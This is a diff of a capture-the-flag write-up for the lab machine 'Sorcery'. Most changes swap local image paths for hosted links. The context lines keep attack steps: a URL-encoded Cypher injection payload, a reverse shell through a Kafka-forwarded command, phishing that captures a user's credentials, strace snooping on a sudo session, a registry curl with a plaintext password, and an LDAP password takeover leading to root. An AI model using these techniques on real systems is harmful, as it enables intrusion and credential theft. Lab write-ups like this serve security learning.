@@ -181,15 +181,13 @@ Cache-Control: s-maxage=31536000, stale-while-revalidate
 
 On visiting the website, we are met with a login page.
 
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250618160002147.png" alt="image-20250618160002147" style="zoom:50%;" />
+![image](https://github.com/user-attachments/assets/96c76334-f89a-432a-bbbd-697020458170)
 
 We register an account, and login and take note of the repo.
 
 We visit the git repo and inspect it, where we find critical information
 
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250618190646438.png" alt="image-20250618190646438" style="zoom:50%;" />									   <img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250618161635419.png" alt="image-20250618161635419" style="zoom: 50%;" />
-
-
+![image](https://github.com/user-attachments/assets/be40fe10-251d-456d-b2f1-ac4ed4f8ab38)![image](https://github.com/user-attachments/assets/9f6584a0-b2c4-4687-a30f-9f4752af7390)
 
 From the headers, cookies and repo wan confirm that we are dealing with a Neo4j backend using Rust bindings (`neo4rs`). The function `query(...)` is probably fed directly with user input (product UUID) **without parameterization**. 
 
@@ -209,7 +207,7 @@ And URL encode it:
 %22%20%7D%29%20RETURN%201%20%2F%2F
 ```
 
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250618170624323.png" alt="image-20250618170624323" style="zoom:50%;" />
+![image](https://github.com/user-attachments/assets/603d3334-8ace-4f13-a69f-84260ad42a05)
 
 This confirms either:
 
@@ -244,11 +242,13 @@ https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D%2
 
 And voila!
 
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250618180933880.png" alt="image-20250618180933880" style="zoom:50%;" />
+![image](https://github.com/user-attachments/assets/ce86ec5d-a45a-41f3-9182-07604ff69aef)
+
 
 On exploring the web site as admin, we notice that most things are disabled for passkey.
 
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250618183739227.png" alt="image-20250618183739227" style="zoom:50%;" />
+![image](https://github.com/user-attachments/assets/90e114a9-bd13-4385-b32c-6f814b98b55d)
+
 
 ---
 
@@ -258,8 +258,8 @@ On exploring the web site as admin, we notice that most things are disabled for 
   
   - Enable virtual authenticator and setup as follows
   
-    <img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250618182108822.png" alt="image-20250618182108822" style="zoom: 50%;" /><img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250618182706455.png" alt="image-20250618182706455" style="zoom: 50%;" />
-  
+    ![image](https://github.com/user-attachments/assets/a9af2102-1e43-49e6-9570-00f069e79a5c)
+![image](https://github.com/user-attachments/assets/d92dc934-2196-4b45-b625-9728385c430a)
   
   
   - We then set passkey in the profile page
@@ -268,7 +268,8 @@ On exploring the web site as admin, we notice that most things are disabled for 
   
 - This grants access to `/dashboard/debug`
 
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250618184728996.png" alt="image-20250618184728996" style="zoom:50%;" />
+![image](https://github.com/user-attachments/assets/293afb49-2e4f-412e-8f23-d62bddabefd7)
+
 
 ---
 
@@ -360,21 +361,22 @@ If successful, the application will:
 
 - Use Kafka to forward the `update` command
 - Another internal service (e.g., `dns`) listens and executes it
-- Your netcat listener gets a **reverse shell**
+- Our netcat listener gets a **reverse shell**
 
+![image](https://github.com/user-attachments/assets/60358e3e-ee64-40e9-ba79-01a8a0a08095)
 
-
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250618195727697.png" alt="image-20250618195727697" style="zoom:67%;" />
 
 - Note: you can change `...'sh -c...' or ...'/bin/bash -c...'` if script fails
 
 - We fill in the boxes and start our listener:
 
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250618201049356.png" alt="image-20250618201049356" style="zoom:50%;" />
+![image](https://github.com/user-attachments/assets/2033e03c-9d2d-4b71-8501-d8aeaa38c240)
+
 
 - And we receive a connection:
 
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250618201118710.png" alt="image-20250618201118710" style="zoom:50%;" />
+![image](https://github.com/user-attachments/assets/b08bf05e-0e0a-4414-8492-e1247944bb4d)
+
 
 ---
 
@@ -382,7 +384,8 @@ If successful, the application will:
 
 Let's explore the blog:
 
-​					   <img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250618205845743.png" alt="image-20250618205845743" style="zoom:50%;" />
+​					   ![image](https://github.com/user-attachments/assets/75c706f0-bc76-4103-9fa0-50f01c87f16b)
+
 
 From the blog, we learn that:
 
@@ -509,7 +512,8 @@ ftp> prompt off
 ftp> mget *
 ```
 
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250618223403573.png" alt="image-20250618223403573" style="zoom:67%;" />
+![image](https://github.com/user-attachments/assets/f750465d-8254-4899-80e0-83d2af7e4185)
+
 
 - Next we register our subdomain with the certificate
 
@@ -550,11 +554,11 @@ Please check this link: https://dev.sorcery.htb/user/login
 "
 ```
 
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250618232031254.png" alt="image-20250618232031254" style="zoom: 50%;" />
-
 - We see that tom clicks on our phishing and we get his credential
 
-![image-20250618232809652](/home/abs0rb/.config/Typora/typora-user-images/image-20250618232809652.png)
+![image](https://github.com/user-attachments/assets/9d7aa5d9-01ef-42bc-9300-5b9120dbec01)
+
+![image](https://github.com/user-attachments/assets/68de5dba-d4cd-4408-83af-ada6a5a5dfa1)
 
 ---
 
@@ -610,8 +614,7 @@ ls -l /xorg/xvfb
 scp tom_summers@sorcery.htb:/xorg/xvfb/Xvfb_screen0 .
 xwud -in Xvfb_screen0
 ```
-
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250619000639274.png" alt="image-20250619000639274" style="zoom:50%;" />
+![image](https://github.com/user-attachments/assets/c3e29b99-166a-428a-ac7a-93c9c3826cd2)
 
 ---
 
@@ -682,16 +685,7 @@ sudo -u rebecca_smith /usr/bin/docker login
 cat /tmp/strace-* | grep rebecca
 ```
 
-![image-20250619002942443](/home/abs0rb/.config/Typora/typora-user-images/image-20250619002942443.png)
-
-### ⚠️ Security Lesson
-
-Allowing unprivileged users to:
-
-- Run `strace` as another user (`sudo -u`)
-- Without restricting the **commands or targets**
-
-...lets attackers spy on input/output of privileged sessions — a **serious information disclosure vector**.
+![image](https://github.com/user-attachments/assets/e45d65aa-64e0-4a13-8ecf-fc11ca76f561)
 
 ---
 
@@ -704,9 +698,8 @@ We try docker login again but it requires otp. For that, we can run **`pspy64` i
  docker login 127.0.0.1:5000
 ```
 
+![image](https://github.com/user-attachments/assets/48a9211c-95ae-4005-b4fd-73da713211bb)
 
-
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250619012748798.png" alt="image-20250619012748798" style="zoom: 50%;" />
 
 ##### **Enumerating Docker Registry**
 
@@ -720,7 +713,8 @@ curl -s -u rebecca_smith:'-7eAZDp9-f9mg699914' \
   http://127.0.0.1:5000/v2/test-domain-workstation/manifests/latest
 ```
 
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250619014815500.png" alt="image-20250619014815500" style="zoom:67%;" />
+![image](https://github.com/user-attachments/assets/3069e644-1cbe-4547-89ea-b72909cac4a0)
+
 
 - **Next we download the blobs**
 
@@ -773,7 +767,8 @@ done
 grep -rniE 'pass|secret|key|token|flag|user' extracted 2>/dev/null
 ```
 
-![image-20250619022103921](/home/abs0rb/.config/Typora/typora-user-images/image-20250619022103921.png)
+![image](https://github.com/user-attachments/assets/02b77845-2a71-4a1c-98fb-8f49d56c624f)
+
 
 And we find our selves another user.
 
@@ -846,16 +841,13 @@ ssh ash_winter@main
 # Change password
 ```
 
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250619030531531.png" alt="image-20250619030531531" style="zoom: 67%;" />
+![image](https://github.com/user-attachments/assets/df0e93f3-7d01-4924-ba6c-261dda2d24ed)
+
 
 - We’ve just abused delegated LDAP access to take over another account.
 
 - **`ipa passwd` / `ldappasswd`**: Try to *change* the password the "official" way, but require both privilege and correct method/overlay.
 - **`ldapmodify`**: *Edits* the `userPassword` attribute directly, if you have write permissions—sometimes possible even if the "official" way is blocked!
-
-P@ssw0rd1234!
-
-P@ssw0rd123!
 
 ---
 
@@ -923,7 +915,8 @@ $ sudo /usr/bin/systemctl restart sssd;exit
 # Re-login
 ```
 
-<img src="/home/abs0rb/.config/Typora/typora-user-images/image-20250619041139120.png" alt="image-20250619041139120" style="zoom:67%;" />
+![image](https://github.com/user-attachments/assets/502e7115-92a8-449b-ba25-319981dbea65)
+
 
 - The possibilities are endless. 
 
@@ -931,7 +924,7 @@ $ sudo /usr/bin/systemctl restart sssd;exit
 sudo su
 ```
 
-![image-20250619041501730](/home/abs0rb/.config/Typora/typora-user-images/image-20250619041501730.png)
+![image](https://github.com/user-attachments/assets/2e079a07-b848-4cf7-b06d-0fab0b9d7e96)
 
 # 			
 
